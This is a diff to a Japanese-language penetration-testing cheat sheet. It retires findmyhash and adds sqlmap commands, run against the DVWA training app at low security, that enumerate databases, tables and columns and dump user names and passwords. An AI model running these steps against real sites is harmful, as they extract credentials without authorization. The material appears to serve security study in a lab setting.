@@ -562,6 +562,17 @@ sudo airodump-ng --channel [CH] --bssid [BSSID] --write [生成ファイルの�
 
 ### findmyhash
 
-```bash
+- かなり古いので使用しない
 
+### Sqlmap
+
+```bash
+# SQLi脆弱性診断。DB名列挙
+sqlmap -u "[target URL]" --cookie="PHPSESSID=gcubcshljo7pusb4dpkl3tn5i2; security=low" --dbs
+# テーブル名列挙
+sqlmap -u "[target URL]" --cookie="PHPSESSID=gcubcshljo7pusb4dpkl3tn5i2; security=low" -D dvwa --tables
+# カラム名列挙
+sqlmap -u "[target URL]" --cookie="PHPSESSID=gcubcshljo7pusb4dpkl3tn5i2; security=low" -D dvwa -T users --column
+# パスワード解析
+sqlmap -u "[target URL]" --cookie="PHPSESSID=gcubcshljo7pusb4dpkl3tn5i2; security=low" -D dvwa -T users -C user,password --dump
 ```
